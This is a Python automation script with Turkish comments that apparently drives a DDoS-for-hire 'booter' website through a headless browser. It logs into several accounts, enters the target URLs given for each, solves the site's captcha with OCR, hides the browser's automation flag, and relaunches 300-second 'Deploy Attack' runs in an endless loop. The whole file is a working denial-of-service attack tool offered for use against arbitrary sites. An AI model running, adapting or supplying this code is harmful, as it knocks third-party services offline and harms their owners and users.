import threading
import time
import os
import re
import base64
import io
import shutil
import sys
import logging
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
from PIL import Image
import ddddocr

# Log
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

log_filename = f"{LOG_DIR}/ddos_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

ocr = ddddocr.DdddOcr()

class DDoSNowManager:
    def __init__(self):
        self.base_url = "https://ipbooter.ba"
        self.accounts = self.load_accounts()
        self.running_states = {}
        self.stop_events = {}
        self.active_threads = {}
        logger.info("=== PROGRAM BAŞLADI ===")
        logger.info(f"Site: {self.base_url}")

    def load_accounts(self):
        accounts = []
        if not os.path.exists("accounts.txt"):
            with open("accounts.txt", "w") as f:
                f.write("test:pass:https://example.com\n")
            logger.warning("accounts.txt oluşturuldu!")
            return []
        with open("accounts.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    # 🔥 DÜZELTME 1: Sadece ilk 2 ':' karakterinde böl, URL'deki ':'leri koru!
                    p = line.split(":", 2)
                    if len(p) == 3:
                        accounts.append({
                            "id": str(len(accounts)+1), 
                            "user": p[0], 
                            "pass": p[1], 
                            "target": p[2]
                        })
                        logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
                    else:
                        logger.warning(f"Geçersiz satır atlandı: {line}")
        return accounts

    def solve_captcha(self, page, username):
        attempt = 0
        while True:
            attempt += 1
            try:
                img_elem = page.locator("img[alt='captcha']").first
                if img_elem.count() == 0:
                    time.sleep(1)
                    continue
                    
                img_src = img_elem.get_attribute("src")
                if not img_src or not img_src.startswith("data:image"):
                    time.sleep(1)
                    continue

                base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
                img_bytes = base64.b64decode(base64_data)
                img = Image.open(io.BytesIO(img_bytes))

                captcha_text = ocr.classification(img)
                captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())

                if not captcha_text:
                    time.sleep(1)
                    continue

                logger.info(f"[{username}] OCR (deneme {attempt}): {captcha_text}")

                captcha_input = page.locator("input[name='captcha']").first
                if captcha_input.count() == 0:
                    logger.error(f"[{username}] Captcha input bulunamadı!")
                    return False
                    
                captcha_input.fill("")
                time.sleep(0.3)
                captcha_input.fill(captcha_text)
                time.sleep(0.5)

                deploy_btn = page.locator("button[type='submit'][form='hubForm']").first
                if deploy_btn.count() == 0:
                    deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
                if deploy_btn.count() == 0:
                    logger.error(f"[{username}] Deploy butonu bulunamadı!")
                    return False
                    
                deploy_btn.click()
                time.sleep(2)

                if page.locator("text=Invalid captcha code").count() > 0:
                    logger.warning(f"[{username}] YANLIŞ captcha: {captcha_text}")
                    captcha_input.fill("")
                    time.sleep(1)
                    continue
                
                if page.locator("text=Attack Launched").count() > 0 or page.locator(".Toastify__toast--success").count() > 0:
                    logger.info(f"[{username}] DOĞRU captcha: {captcha_text} - Attack başlatıldı!")
                    return True
                    
                logger.info(f"[{username}] DOĞRU captcha: {captcha_text}")
                return True
                    
            except Exception as e:
                logger.error(f"[{username}] Captcha hatası (deneme {attempt}): {e}")
                time.sleep(2)
                continue

    def browser_worker(self, acc_id, target_url, account_data):
        username = account_data["user"]
        password = account_data["pass"]
        profile_dir = os.path.join(os.getcwd(), f"profiles/profile_{username}")
        stop_event = self.stop_events.get(acc_id)
        
        logger.info(f"[{username}] Worker başlatıldı - Hedef: {target_url}")

        while self.running_states.get(acc_id, False):
            try:
                if os.path.exists(profile_dir):
                    shutil.rmtree(profile_dir, ignore_errors=True)
                os.makedirs(profile_dir, exist_ok=True)

                with sync_playwright() as p:
                    context = p.chromium.launch_persistent_context(
                        user_data_dir=profile_dir,
                        headless=True,
                        args=['--no-sandbox', '--disable-setuid-sandbox'],
                        viewport={"width": 1280, "height": 720},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    )
                    page = context.new_page()
                    page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

                    # LOGIN
                    try:
                        logger.info(f"[{username}] Giriş sayfası...")
                        page.goto(f"{self.base_url}/login", timeout=60000)
                        page.wait_for_load_state("networkidle", timeout=30000)
                        time.sleep(3)
                        
                        page.fill("input[name='username']", username, timeout=30000)
                        page.fill("input[name='password']", password, timeout=30000)
                        page.click("button[type='submit']", timeout=30000)
                        logger.info(f"[{username}] Login butonuna tıklandı")
                        time.sleep(5)
                    except Exception as e:
                        logger.error(f"[{username}] Login hatası: {e}")
                        time.sleep(30)
                        continue
                    
                    try:
                        got_it = page.locator("button:has-text('Got it')").first
                        if got_it.count() > 0:
                            got_it.click()
                            time.sleep(2)
                    except:
                        pass
                    
                    # HUB
                    try:
                        logger.info(f"[{username}] Hub sayfası...")
                        page.goto(f"{self.base_url}/hub", timeout=60000)
                        page.wait_for_load_state("networkidle", timeout=30000)
                        time.sleep(3)
                        
                        if "login" in page.url:
                            logger.error(f"[{username}] Giriş başarısız!")
                            time.sleep(30)
                            continue
                        
                        logger.info(f"[{username}] Giriş başarılı!")
                    except Exception as e:
                        logger.error(f"[{username}] Hub hatası: {e}")
                        time.sleep(30)
                        continue

                    # ANA DÖNGÜ
                    attack_count = 0
                    while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                        try:
                            attack_count += 1
                            logger.info(f"[{username}] Attack #{attack_count} başlatılıyor...")
                            
                            # 1. URL'yi gir
                            target_input = page.locator("input[name='hub.0.host']").first
                            if target_input.count() == 0:
                                logger.error(f"[{username}] URL input bulunamadı!")
                                page.reload()
                                time.sleep(3)
                                continue
                            
                            # 🔥 DÜZELTME 2: Önce temizle, sonra doğru URL'yi gir
                            target_input.fill("")
                            time.sleep(0.5)
                            target_input.fill(target_url)
                            logger.info(f"[{username}] Hedef URL: {target_url}")
                            
                            # 2. Süre inputunun açılmasını bekle (max 15 saniye)
                            # 🔥 DÜZELTME 3: wait_for_selector kullan, döngü değil
                            try:
                                time_input = page.wait_for_selector("input[name='hub.0.time']", timeout=15000)
                                logger.info(f"[{username}] Süre inputu aktif!")
                            except PlaywrightTimeout:
                                logger.error(f"[{username}] Süre input 15 saniyede açılmadı! Muhtemelen URL geçersiz.")
                                page.reload()
                                time.sleep(5)
                                continue
                            
                            time_input.fill("")
                            time.sleep(0.5)
                            time_input.fill("300")
                            logger.info(f"[{username}] Süre: 300 saniye")
                            
                            # 3. Deploy Attack butonuna tıkla
                            deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
                            if deploy_btn.count() == 0:
                                deploy_btn = page.locator("button:has-text('Deploy Attack')").first
                            if deploy_btn.count() == 0:
                                logger.error(f"[{username}] Deploy butonu bulunamadı!")
                                page.reload()
                                time.sleep(3)
                                continue
                            deploy_btn.click()
                            logger.info(f"[{username}] Deploy butonuna tıklandı")
                            time.sleep(2)
                            
                            # 4. Captcha çöz
                            if not self.solve_captcha(page, username):
                                logger.error(f"[{username}] Captcha çözülemedi!")
                                page.reload()
                                time.sleep(5)
                                continue
                            
                            logger.info(f"[{username}] Attack başladı!")
                            
                            # 5. Süre takibi
                            while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                try:
                                    badge = page.locator(".accordion-button .badge").first
                                    if badge.count() > 0:
                                        t = badge.text_content().strip()
                                        logger.info(f"[{username}] Kalan süre: {t}")
                                        if t in ["0m 0s", "0s", "0"]:
                                            logger.info(f"[{username}] Süre doldu!")
                                            break
                                    else:
                                        running = page.locator(".stats-content .badge:has-text('Running')").first
                                        if running.count() == 0:
                                            logger.info(f"[{username}] Attack bitti!")
                                            break
                                except:
                                    pass
                                time.sleep(5)
                            
                            if not self.running_states.get(acc_id, False):
                                break
                            
                            # 6. Yenile
                            logger.info(f"[{username}] Yeniden başlatılıyor...")
                            page.reload()
                            time.sleep(5)
                            if "/hub" not in page.url:
                                page.goto(f"{self.base_url}/hub")
                                time.sleep(3)
                            
                        except Exception as e:
                            logger.error(f"[{username}] İşlem hatası: {e}")
                            page.reload()
                            time.sleep(5)
                            continue
                    
                    context.close()
                    
            except Exception as e:
                logger.error(f"[{username}] KRİTİK HATA: {e}")
                time.sleep(10)
                continue
        
        logger.info(f"[{username}] Durduruldu")
        self.running_states[acc_id] = False

    def start_all(self):
        if not self.accounts:
            logger.error("Hiç hesap yok!")
            return
            
        logger.info(f"{len(self.accounts)} hesap başlatılıyor...")
        for acc in self.accounts:
            acc_id = acc["id"]
            target = acc.get("target", "https://example.com")
            self.running_states[acc_id] = True
            self.stop_events[acc_id] = threading.Event()
            t = threading.Thread(target=self.browser_worker, args=(acc_id, target, acc), daemon=True)
            self.active_threads[acc_id] = t
            t.start()
            logger.info(f"[{acc['user']}] Başlatıldı -> {target}")
            time.sleep(3)
        
        while True:
            time.sleep(60)
            logger.info("="*50)
            logger.info("AKTİF HESAPLAR:")
            for acc in self.accounts:
                acc_id = acc["id"]
                status = "Çalışıyor" if self.running_states.get(acc_id, False) else "Durduruldu"
                logger.info(f"  {acc['user']}: {status} -> {acc.get('target', '?')}")
            logger.info("="*50)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║   IPBOOTER.BA - DDOS AUTOMATION           ║
    ╚═══════════════════════════════════════════╝
    """)
    manager = DDoSNowManager()
    manager.start_all()
